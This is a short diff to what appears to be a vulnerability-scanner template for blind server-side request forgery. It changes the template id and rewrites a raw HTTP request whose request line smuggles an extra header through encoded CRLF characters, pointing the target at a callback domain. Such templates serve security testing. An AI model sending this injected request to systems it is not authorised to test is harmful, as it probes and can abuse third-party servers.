@@ -1,4 +1,4 @@
-id: 0x105
+id: 0x111
 
 info:
   name: Blind SSRF
@@ -8,10 +8,10 @@ info:
 requests:
   - raw:
     - |+
-      GET /%20HTTP/1.10x0D0x0ADX-Forwarded-Host:%20{{Host}}.{{Port}}.BSSRF-105.{{MY-DOMAIN}}0x0D0x0A0x0D0x0A HTTP/1.1
+      GET /%20HTTP/1.1%3F%0DX-Host:%20{{Host}}.{{Port}}.BSSRF-111.{{MY-DOMAIN}}%3F%0D%3F%0D HTTP/1.1
       Host: {{Hostname}}
-      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
       Cache-Control: no-transform
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
       Accept-Encoding: gzip, deflate
       Accept: */*
 
